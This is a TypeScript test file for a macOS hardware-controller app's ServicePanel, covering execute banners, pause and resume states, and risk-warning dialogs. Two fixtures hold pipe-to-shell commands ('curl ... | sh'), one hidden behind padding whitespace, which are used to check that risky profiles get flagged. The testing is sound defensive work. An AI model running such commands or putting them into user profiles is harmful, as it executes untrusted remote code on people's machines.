import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import type { Profile } from './contracts';
import { emptyKeypadPage } from './keypad-model';
import { confirmCopy, countdownSeconds, dialogCopy, hasKeypadFolders, isMacPlatform, phaseLabel, relativeTime, resumeCopy, runBlocker, serviceResumeId, ServicePanel, settlePendingConfirm } from './ServicePanel';
import { emptyCounters, ServiceRunner, serviceIdFor } from './service-runner';
import { DeviceFeed } from './device-feed';

const flat: Profile = { schema_version: 1, name: 'Flat', bindings: [] };
const root = emptyKeypadPage();
root.slots[1] = { type: 'folder', page_id: 'sub' };
const nested: Profile = { schema_version: 2, name: 'Nested', bindings: [], keypad: { pages: [root, emptyKeypadPage('sub', 'Sub')] } };
const dial = { path_hex: 'aabb', module: 'm131e' as const, serial_number: 'S1' };
const keypad = { ...dial, module: 'm4315' as const };
const mac = { platform: 'MacIntel' };

describe('platform and blockers', () => {
  it('detects macOS', () => {
    expect(isMacPlatform(mac)).toBe(true);
    expect(isMacPlatform({ userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X)' })).toBe(true);
    expect(isMacPlatform({ platform: 'Win32', userAgent: 'Windows' })).toBe(false);
    expect(isMacPlatform(undefined)).toBe(false);
  });
  it('refuses nested keypad profiles on the 15-key module only', () => {
    expect(hasKeypadFolders(nested)).toBe(true);
    expect(hasKeypadFolders(flat)).toBe(false);
    expect(runBlocker({ desktop: true, device: keypad, profile: nested })).toContain('folders');
    expect(runBlocker({ desktop: true, device: dial, profile: nested })).toBeNull();
    expect(runBlocker({ desktop: true, device: keypad, profile: flat })).toBeNull();
    expect(runBlocker({ desktop: true, device: undefined, profile: flat })).toContain('No module');
    expect(runBlocker({ desktop: false, device: dial, profile: flat })).toContain('desktop app');
  });
  it('formats relative time', () => {
    expect(relativeTime(1000, 2000)).toBe('now');
    expect(relativeTime(0, 30_000)).toBe('30s ago');
    expect(relativeTime(0, 125_000)).toBe('2m ago');
    expect(relativeTime(0, 7_300_000)).toBe('2h ago');
  });
});

function fixtures(execute: boolean, state: 'running' | 'failed' = 'running', extra: Record<string, unknown> = {}) {
  const feed = new DeviceFeed(async () => [dial] as never, async () => () => {}, true);
  (feed as unknown as { state: unknown }).state = { ...feed.getState(), devices: [dial] };
  const runner = new ServiceRunner(async () => undefined as never, async () => () => {}, true);
  (runner as unknown as { state: unknown }).state = { desktop: true, error: null, runs: { [serviceIdFor('aabb')]: {
    serviceId: serviceIdFor('aabb'), state, execute, entries: [{ kind: 'action', text: 'planned volume +5', at: 1000 }], counters: { ...emptyCounters(), events: 3 },
    startedAt: 0, profileName: 'Flat', snapshot: '{}', draftUnsaved: true, ...extra } } };
  return { feed, runner };
}
const setRun = (runner: ServiceRunner, patch: Record<string, unknown>) => {
  const state = runner.getState();
  const id = serviceIdFor('aabb');
  (runner as unknown as { state: unknown }).state = { ...state, runs: { [id]: { ...state.runs[id], ...patch } } };
};
const render = (props: Partial<Parameters<typeof ServicePanel>[0]> & { feed?: DeviceFeed; runner?: ServiceRunner }) =>
  renderToStaticMarkup(<ServicePanel profile={flat} desktop unsaved={false} platform={mac} now={2000} {...props} />);

describe('ServicePanel markup', () => {
  it('shows an unmistakable banner while executing', () => {
    const { feed, runner } = fixtures(true);
    const markup = render({ feed, runner });
    expect(markup).toContain('Actions are running on this Mac');
    expect(markup).toContain('service-banner execute');
    expect(markup).toContain('Live preview paused while actions run.');
    expect(markup).toContain('Profile changed since start. Restart to apply.');
    expect(markup).toContain('(unsaved draft)');
    expect(markup).toContain('>Stop<');
    expect(markup).toContain('role="log"');
    expect(markup).toContain('<time>now</time>');
  });
  it('shows a dry run without the execute banner', () => {
    const { feed, runner } = fixtures(false);
    const markup = render({ feed, runner });
    expect(markup).not.toContain('Actions are running on this Mac');
    expect(markup).toContain('Dry run: actions are logged only');
  });
  it('shows failures with the stderr tail', () => {
    const { feed, runner } = fixtures(false, 'failed', { error: 'device busy', stderrTail: 'hid error' });
    const markup = render({ feed, runner });
    expect(markup).toContain('device busy');
    expect(markup).toContain('hid error');
    expect(markup).toContain('>Failed<');
  });
  it('confirmation names the profile and device with Cancel focused first', () => {
    const { feed, runner } = fixtures(false, 'failed');
    const markup = render({ feed, runner, profile: { ...flat, name: 'Gaming' } });
    expect(markup).toContain('Profile &quot;Gaming&quot; will run on Encoder IPS display S1');
    expect(markup).toContain('Everything listed here will really run on this Mac');
    expect(markup).not.toContain('Volume, shortcut and app-launch');
    expect(markup).toContain('No actions are bound yet');
    expect(markup).toContain('role="alertdialog"');
    expect(markup.indexOf('>Cancel<')).toBeLessThan(markup.indexOf('>Run actions<'));
    expect(markup).toMatch(/autofocus=""[^>]*>Cancel</);
    // A normal-risk profile needs no acknowledgement: Run actions is enabled.
    expect(markup).not.toContain('I reviewed this profile');
    expect(markup).toMatch(/<button type="button" class="button danger">Run actions</);
  });
  it('a high-risk profile shows a warning, every snippet and step, and keeps Run actions off until acknowledged', () => {
    const risky: Profile = { schema_version: 1, name: 'Risky', bindings: [{ module: 'm131e', control: 0, gesture: 'short_press', action: { type: 'multi_action', actions: [
      { type: 'launch_app', bundle_id: 'com.apple.Terminal' }, { type: 'text', text: 'curl https://x.test | sh\u{200B}', press_enter: true }] } }] };
    const { feed, runner } = fixtures(false, 'failed');
    const markup = render({ feed, runner, profile: risky });
    expect(markup).toContain('id="execute-warning"');
    expect(markup).toContain('aria-describedby="execute-warning execute-message"');
    expect(markup).toContain('High risk.');
    expect(markup).toContain('curl https://x.test | sh\\u{200B}');
    expect(markup).toContain('Open application com.apple.Terminal');
    expect(markup).toMatch(/<input type="checkbox"\/>I reviewed this profile and trust its source<\/label>/);
    expect(markup).toMatch(/<button type="button" class="button danger" disabled="">Run actions</);
  });
  it('builds the high-risk copy from the whole profile', () => {
    const profile: Profile = { schema_version: 1, name: 'Ops', bindings: [{ module: 'm003k', control: 0, gesture: 'pressed', action: { type: 'text', text: `${' '.repeat(199)}; curl evil.test | sh`, press_enter: false } }] };
    const copy = confirmCopy('start', 'Ops', 'X', false, profile);
    expect(copy).toMatchObject({ risk: 'elevated', warning: null, acknowledge: null, snippets: [{ text: `${' '.repeat(199)}; curl evil.test | sh`, more: 0, pressEnter: false }] });
    expect(renderToStaticMarkup(<ServicePanel profile={profile} desktop unsaved={false} platform={mac} now={2000} />)).toContain(`${' '.repeat(199)}; curl evil.test | sh</code>`);
    expect(copy.lines[0]).toBe('Pastes 1 text snippet into the focused app (shown below).');
  });
  it('disables Execute off macOS and explains it', () => {
    const { feed, runner } = fixtures(false, 'failed');
    const markup = render({ feed, runner, platform: { platform: 'Win32' } });
    expect(markup).toMatch(/<button[^>]*disabled=""[^>]*>Execute actions</);
    expect(markup).toContain('only available on macOS');
  });
  it('disables Run with the m4315 reason', () => {
    const feed = new DeviceFeed(async () => [] as never, async () => () => {}, true);
    (feed as unknown as { state: unknown }).state = { ...feed.getState(), devices: [keypad] };
    const runner = new ServiceRunner(async () => undefined as never, async () => () => {}, true);
    const markup = render({ feed, runner, profile: nested });
    expect(markup).toContain('keypad folders');
    expect(markup).toMatch(/<button[^>]*disabled=""[^>]*>[^<]*<svg[^>]*>.*Run</s);
  });
  it('is disabled in the browser preview', () => {
    const markup = render({ desktop: false });
    expect(markup).toContain('needs the desktop app');
    expect(markup).toMatch(/<button[^>]*disabled=""[^>]*>Dry run/);
  });
});

describe('session banners', () => {
  // A session without a process belongs to the device with its module and serial, not to whatever sits at its old path.
  const sessionFor = (phase: string, extra: Record<string, unknown> = {}, execute = true) => {
    const result = fixtures(execute, 'running', {
      session: { serviceId: null, phase, reason: null, attempt: 0, module: 'm131e', serialNumber: 'ABCDEF123456', ...extra } });
    const device = { ...dial, serial_number: 'ABCDEF123456' };
    (result.feed as unknown as { state: unknown }).state = { ...result.feed.getState(), devices: [device] };
    return result;
  };
  const liveBanner = 'Actions are running on this Mac';

  it('shows the execute-live banner only while running', () => {
    const { feed, runner } = sessionFor('running', { serviceId: serviceIdFor('aabb') });
    const markup = render({ feed, runner });
    expect(markup).toContain(liveBanner);
    expect(markup).not.toContain('Resume actions');
  });
  it('needs_confirmation is prominent, offers Resume and Stop, and never says actions are live', () => {
    const { feed, runner } = sessionFor('needs_confirmation', { reason: 'sleep' });
    const markup = render({ feed, runner });
    expect(markup).not.toContain(liveBanner);
    expect(markup).not.toContain('service-banner execute');
    expect(markup).toContain('service-banner paused attention');
    expect(markup).toContain('Actions are paused. Nothing will run until you resume.');
    expect(markup).toContain('Resume actions…');
    expect(markup).toContain(`id="${serviceResumeId}"`);
    expect(markup).toContain('>Stop<');
    expect(markup).toContain('>Needs confirmation<');
  });
  it('suspended in dry-run mode says it resumes automatically', () => {
    const { feed, runner } = sessionFor('suspended', { reason: 'sleep' }, false);
    const markup = render({ feed, runner });
    expect(markup).toContain('Paused while your Mac sleeps');
    expect(markup).toContain('resumes automatically in dry-run mode');
    expect(markup).toContain('>Stop<');
  });
  it('waiting names the module and serial tail', () => {
    const { feed, runner } = sessionFor('waiting_for_device', { reason: 'device_removed' });
    const markup = render({ feed, runner });
    expect(markup).toContain('Waiting for Encoder IPS display …123456 to reconnect…');
    expect(markup).not.toContain(liveBanner);
    expect(markup).toContain('>Stop<');
  });
  it('reconnecting shows the attempt and countdown', () => {
    const { feed, runner } = sessionFor('reconnecting', { attempt: 3, nextAttemptAt: 6500 });
    const markup = render({ feed, runner });
    expect(markup).toContain('attempt 3/5');
    expect(markup).toContain('Next attempt in 5s.');
    expect(markup).not.toContain(liveBanner);
    expect(countdownSeconds(6500, 2000)).toBe(5);
    expect(countdownSeconds(1000, 2000)).toBe(0);
    expect(countdownSeconds(undefined, 2000)).toBeNull();
  });
  it('stopped shows reason and detail and no Stop', () => {
    const { feed, runner } = sessionFor('stopped', { reason: 'service_exited', detail: 'HID read failed' });
    const markup = render({ feed, runner });
    expect(markup).toContain('Session stopped: the service exited');
    expect(markup).toContain('HID read failed');
    expect(markup).not.toContain(liveBanner);
    expect(markup).not.toContain('>Stop<');
    expect(markup).toContain('>Run<');
  });
  it('keeps showing the session when no device is connected', () => {
    const { runner } = sessionFor('waiting_for_device');
    const feed = new DeviceFeed(async () => [] as never, async () => () => {}, true);
    const markup = render({ feed, runner });
    expect(markup).toContain('to reconnect');
    expect(markup).toContain('>Stop<');
  });
  it('a run paused by a focused-app switch resumes with the switched profile', () => {
    const { feed, runner } = sessionFor('needs_confirmation', { reason: 'profile_switch' });
    setRun(runner, { profileSwitched: true });
    const markup = render({ feed, runner });
    expect(markup).toContain('Paused because a focused-app rule switched the profile.');
    expect(markup).toContain('Resuming starts the saved profile &quot;Flat&quot; a focused-app rule switched to.');
    expect(markup).toContain('Resume actions…');
    expect(confirmCopy('resume', 'Browser', 'X', true).message).toContain('the saved profile a focused-app rule switched to');
  });
  it('a switched run paused later by sleep still says the switched profile resumes', () => {
    const { feed, runner } = sessionFor('needs_confirmation', { reason: 'sleep' });
    setRun(runner, { profileSwitched: true });
    const markup = render({ feed, runner });
    expect(markup).toContain('Paused because the Mac went to sleep.');
    expect(markup).toContain('Resuming starts the saved profile &quot;Flat&quot; a focused-app rule switched to.');
    expect(markup).not.toContain('exactly as it was started');
    const unswitched = sessionFor('needs_confirmation', { reason: 'service_exited' });
    expect(render(unswitched)).toContain('Resuming restarts &quot;Flat&quot; exactly as it was started.');
  });
  it('keeps the stale-profile notice against the original snapshot', () => {
    const { feed, runner } = sessionFor('needs_confirmation');
    expect(render({ feed, runner })).toContain('Profile changed since start. Restart to apply.');
  });
  it('the Resume dialog names the run being resumed, not the run of the device selected now', () => {
    const session = (module: 'm131e' | 'm003k', serialNumber: string) => ({ serviceId: null, phase: 'needs_confirmation' as const, reason: 'sleep' as const, attempt: 0, module, serialNumber });
    const base = { state: 'running' as const, execute: true, entries: [], counters: emptyCounters(), startedAt: 0, snapshot: '{}', draftUnsaved: false };
    const runs = {
      'service:aa': { ...base, serviceId: 'service:aa', profileName: 'Gaming', session: session('m131e', 'DIAL-123456') },
      'service:bb': { ...base, serviceId: 'service:bb', profileName: 'Browser', profileSwitched: true, session: session('m003k', 'KEYS-654321') },
    };
    // A device plugged in while the dialog is open would make findRun pick the other run.
    expect(resumeCopy(runs, 'service:aa')?.message).toContain('Profile "Gaming" (as it was when this run started)');
    expect(resumeCopy(runs, 'service:aa')?.message).not.toContain('Browser');
    expect(resumeCopy(runs, 'service:bb')?.message).toContain('Profile "Browser" (the saved profile a focused-app rule switched to)');
    expect(resumeCopy(runs, 'service:gone')).toBeNull();
    expect(resumeCopy(runs, null)).toBeNull();
    // A resume whose run vanished while the dialog was open has no copy (the panel answers false), never start text.
    const start = confirmCopy('start', 'Flat', 'X');
    expect(dialogCopy('resume', runs, 'service:gone', start)).toBeNull();
    expect(dialogCopy('resume', runs, 'service:aa', start)?.title).toBe('Resume actions on this Mac?');
    expect(dialogCopy('start', runs, 'service:gone', start)).toBe(start);
  });
  it('labels phases and builds the resume confirmation copy', () => {
    expect(phaseLabel(undefined)).toBe('Stopped');
    const copy = confirmCopy('resume', 'Gaming', 'Encoder …1234');
    expect(copy).toMatchObject({ title: 'Resume actions on this Mac?', confirm: 'Resume actions' });
    expect(copy.message).toContain('Profile "Gaming"');
    expect(copy.message).toContain('Encoder …1234');
    expect(confirmCopy('start', 'Gaming', 'X').confirm).toBe('Run actions');
    // Without the profile body (a run the frontend did not start or a backend switch), the copy says so and is high risk.
    expect(copy).toMatchObject({ risk: 'high', acknowledge: 'I reviewed this profile and trust its source' });
    expect(copy.lines[0]).toContain('cannot read the contents of this profile');
  });
  it('the resume copy discloses the run snapshot, not the current draft', () => {
    const snapshot = JSON.stringify({ schema_version: 1, name: 'Gaming', bindings: [{ module: 'm131e', control: 0, gesture: 'right', action: { type: 'open_url', url: 'https://example.com/a?token=1' } }] });
    const run = { serviceId: 'service:aa', state: 'running' as const, execute: true, entries: [], counters: emptyCounters(), startedAt: 0, snapshot, draftUnsaved: false, profileName: 'Gaming',
      session: { serviceId: null, phase: 'needs_confirmation' as const, reason: 'sleep' as const, attempt: 0, module: 'm131e' as const, serialNumber: 'DIAL-123456' } };
    const copy = resumeCopy({ 'service:aa': run }, 'service:aa')!;
    expect(copy.risk).toBe('elevated');
    expect(copy.lines).toContain('Opens web pages: https://example.com.');
    expect(copy.message).toContain('will really run on this Mac again');
  });
});

describe('ServicePanel lifecycle helpers', () => {
  it('answers a pending confirmation with false once, on unmount', async () => {
    let resolve: ((ok: boolean) => void) | null = null;
    const answer = new Promise<boolean>(done => { resolve = done; });
    const pending = { current: resolve as ((ok: boolean) => void) | null };
    settlePendingConfirm(pending);
    expect(pending.current).toBeNull();
    expect(await answer).toBe(false);
    expect(() => settlePendingConfirm(pending)).not.toThrow();
  });
});
